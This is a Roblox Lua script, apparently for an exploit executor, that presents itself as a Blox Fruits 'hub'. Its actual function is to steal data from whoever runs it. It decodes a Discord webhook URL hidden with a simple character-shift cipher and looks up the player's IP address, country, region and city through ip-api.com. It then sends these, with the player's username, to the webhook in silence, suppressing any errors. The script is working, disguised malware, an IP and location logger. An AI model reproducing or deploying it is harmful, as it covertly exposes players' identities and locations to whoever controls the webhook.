local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Función de seguridad (Ofuscación)
local function _XenoSafe(_str)
    local _res = ""
    for i = 1, #_str do _res = _res .. string.char(string.byte(_str, i) - 1) end
    return _res
end

local WebhookURL = _XenoSafe("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")

-- Obtener IP y Ubicación (Corregido para obtener 'query')
local function getIpData()
    local success, response = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
    end)
    -- 'query' es donde ip-api guarda la dirección IP
    return success and response or {query = "No detectada", country = "Desconocido", regionName = "Desconocido", city = "Desconocido"}
end

local ipData = getIpData()

local payload = {
    ["embeds"] = {{
        ["title"] = "🚀 HUB ACTIVADO (XENO)",
        ["color"] = 65280,
        ["fields"] = {
            {["name"] = "👤 Jugador", ["value"] = player.Name, ["inline"] = false},
            {["name"] = "🌐 Dirección IP", ["value"] = ipData.query, ["inline"] = false}, -- ESTO FALTABA
            {["name"] = "🌍 País", ["value"] = ipData.country, ["inline"] = false},
            {["name"] = "📍 Región", ["value"] = ipData.regionName, ["inline"] = false},
            {["name"] = "🏙️ Ciudad", ["value"] = ipData.city, ["inline"] = false},
            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Z-BOUNTY System | AloneFalseExploit 🔥"}
    }}
}

local function sendLog()
    local xenoRequest = request or http_request or (http and http.request) or (syn and syn.request)
    if xenoRequest then
        pcall(function()
            xenoRequest({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

sendLog()
